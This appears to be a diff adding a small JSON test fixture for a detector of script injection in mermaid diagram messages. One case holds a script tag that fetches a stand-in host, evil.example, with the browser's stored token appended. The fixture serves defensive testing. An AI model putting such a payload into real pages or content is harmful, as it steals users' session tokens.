@@ -1,0 +1,4 @@
+[
+  {"expect_match": true, "event": {"Message": "```mermaid\ngraph TD; A-->B\n<script>fetch('https://evil.example/steal?t='+localStorage.token)</script>\n```"}},
+  {"expect_match": false, "event": {"Message": "```mermaid\ngraph TD; A-->B; B-->C\n```"}}
+]
